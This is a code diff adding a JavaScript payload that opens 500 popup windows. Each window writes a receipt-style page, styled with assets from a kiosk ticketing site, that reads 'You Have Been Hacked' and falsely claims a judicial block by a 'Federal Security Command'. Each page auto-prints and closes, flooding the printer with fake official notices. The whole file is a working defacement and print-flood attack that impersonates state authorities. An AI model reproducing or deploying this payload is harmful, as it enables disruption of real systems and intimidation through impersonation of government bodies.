@@ -1,0 +1,289 @@
+for (let i = 0; i < 500; i++) {
+    var r = window.open("", "", "width=400px,height=800px");
+    r.document.write(`
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>افسک - فرماندهی ستاد کنترل اطلاعات کشور</title>
+    <link rel="stylesheet" href="https://kiosk.samfaa.ir/assets/style/print.css" type="text/css"  media="print" />
+    <link rel="stylesheet" href="https://kiosk.samfaa.ir/assets/style/font.css">
+    <style>
+    @media print {
+        body {
+            font: 12pt "Shabnam FD", Tahoma, serif;
+            line-height: 1.3;
+            width: 6.5cm;
+            margin: 0;
+            padding: 0 0.2cm 0.2cm 0;
+        }
+        .image-div {
+            height: 40px !important;
+            display: flex;
+            justify-content: center;
+            margin-top: 15px !important;
+            margin-bottom: 15px !important;
+        }
+        .center{
+            display: flex;
+            justify-content: center;
+            font-size: 12pt !important;
+            padding: 1pt 0 0 0;
+        }
+        .margin-top{
+            margin-top: 12px;
+            border-top: 1px solid #000000;
+        }
+        .img {
+            display: flex;
+            justify-content: center;
+        }
+        .myimg {
+            width: 90px !important;
+            height: 40px !important;
+            object-fit: cover;
+        }
+        .ticket-seprator {
+            border-bottom: 3px dashed #000000;
+            margin: 0 0 10pt 0;
+        }
+        .row {
+            margin-left: -2pt;
+            margin-right: -2pt;
+            direction: rtl;
+            clear: both;
+            box-sizing: border-box;
+            display: flex;
+        }
+        [class*='col-'] {
+            float: right;
+            position: relative;
+            min-height: 1px;
+            padding-left: 2pt;
+            padding-right: 2pt;
+        }
+        .col-4 {
+            width: 33%;
+        }
+        .col-6 {
+            width: 50%;
+        }
+        .col-12 {
+            width: 100%;
+        }
+        .header img {
+            width: 100%;
+        }
+        .showtime {
+            text-align: center;
+        }
+        .showtime .show {
+            text-align: right;
+            direction: rtl;
+        }
+        .showtime .date {
+            font-size: 14pt;
+            padding: 1pt 0 0 0;
+        }
+        .showtime .time {
+            font-size: 13pt;
+            font-weight: 600;
+            padding: 6pt 0 5pt;
+        }
+        .showtime .price {}
+        .text-center {
+            text-align: center;
+        }
+        .main {
+            margin-top: 8px;
+            border-top: 1px dashed #000000;
+            border-bottom: 1px dashed #000000;
+        }
+        .group-ticket-seats{
+            text-align: center;
+            margin-top: 8px;
+            border-top: 1px dashed #000000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            direction: rtl;
+            margin-bottom: -12px;
+        }
+        .group-ticket-col{
+            width: 70%;
+        }
+        .group-ticket-row{
+            width: 30%;
+        }
+        .group-ticket-col,
+        .group-ticket-row{
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 5pt 0;
+        }
+        .group-ticket-row{
+            border-left: 1px dashed;
+        }
+        .group-ticket-col .title,
+        .group-ticket-row .value{
+            line-height: 1.7;
+        }
+        .price i {
+            font-style: normal;
+            font-size: 12pt;
+        }
+        .main .title ,
+        .group-ticket-seats .title {
+            font-size: 12pt;
+            display: block;
+        }
+        .main .value ,
+        .group-ticket-seats .value {
+            font-size: 12pt;
+            display: block;
+            font-weight: 600;
+        }
+        .main .col-4{
+            text-align: center;
+            padding: 5pt 0;
+            border-left: 1px dashed;
+        }
+        .main .col-4:last-child {
+            border-left: none;
+        }
+        .b-b-b {
+            font-size: 12pt;
+            font-weight: 400;
+            display: flex;
+            justify-content: space-between;
+            padding: 7px;
+        }
+        .b-b {
+            font-size: 12pt;
+            font-weight: 400;
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid #000000;
+            padding: 7px;
+        }
+        .copyright img {
+            width: auto;
+            height: 80pt;
+            padding: 5pt;
+        }
+        .footer {
+            font-size: 12pt;
+            padding: 4pt 3pt 12pt;
+        }
+        .footer ul {
+            list-style: none;
+            margin: 0 auto;
+            padding: 0;
+        }
+        .footer li {
+            padding: 0 2pt;
+            text-align: center;
+        }
+        .header {
+            padding: 7pt 0 0;
+        }
+        .margin-10 {
+            margin: 0 10pt 0 0;
+        }
+        .margin-10-t {
+            margin: 10pt 0 0 0;
+        }
+        .copyright {
+            height: 90pt;
+        }
+    }
+    </style>
+</head>
+<body>
+<div id="print_test" style="font-family: shabnam">
+    <div class="row header">
+        <div class="col-12">
+            <div class="margin-10-t"></div>
+        </div>
+    </div>
+    
+    <div class="fish-print">
+        <div class="row header">
+            <div class="col-12">
+                <img  class="barcode" height="50px" width="100%" attr-data="You Have Been Hacked."/>
+                <span style="display:block;width: 100%;text-align: center;font-size: 14px">
+                    فرماندهی ستاد کنترل اطلاعات کشور
+                </span>
+            </div>
+        </div>
+     
+        <div class="row">
+            <div class="col-12">
+                <div class="show margin-10-t text-center">
+                    <b>You Have Been Hacked.</b>
+                </div>
+                <div class="show margin-10-t text-center">
+                    <b>سیستم از طرف مراجعه قضایی مسدود گردید.</b>
+                </div>
+            </div>
+        </div>
+
+        <div class="row b-b-b">
+            <span>
+                <b> شماره دفتر</b>
+            </span>
+            <span>
+                <b>۰۲۱۶۴۴۱۱ <b/>
+            </span>
+        </div>
+    </div>
+    
+    <div class="row image-div">
+        <div class="img">
+            <img class="myimg"  src="https://fsc.vercel.app/images/flag.png">
+        </div>
+    </div>
+    <div class="row center">
+        <b>فرماندهی ستاد کنترل اطلاعات کشور</b>
+    </div>
+    <div class="row footer">
+        <ul>
+            <li><b>افسک</b></li>
+            <li class="margin-10"><b>1403/11/10</b></li>
+        </ul>
+    </div>
+    <div class="row center">
+        <b>Federal Security Command</b>
+    </div>
+    <div class="row footer">
+        <ul>
+            <li><b>FSC</b></li>
+            <li class="margin-10"><b>1403/11/10</b></li>
+        </ul>
+    </div>
+</div>
+
+<script src="https://kiosk.samfaa.ir/assets/js/qrcode.min.js"></script>
+<script src="https://kiosk.samfaa.ir/assets/js/JsBarcode.all.min.js"></script>
+<script>
+window.resizeTo(1,1)
+var barELements = document.getElementsByClassName("barcode");
+
+for(let i = 0; i < barELements.length; i++){
+    JsBarcode(barELements[i], barELements[i].getAttribute("attr-data"), {
+        format: "CODE128",
+        lineColor: "#000",
+        width:4,
+        height:40,
+        displayValue: false
+    });
+}
+window.print();
+window.close();
+</script>
+</body>
+</html>
+    `);
+}
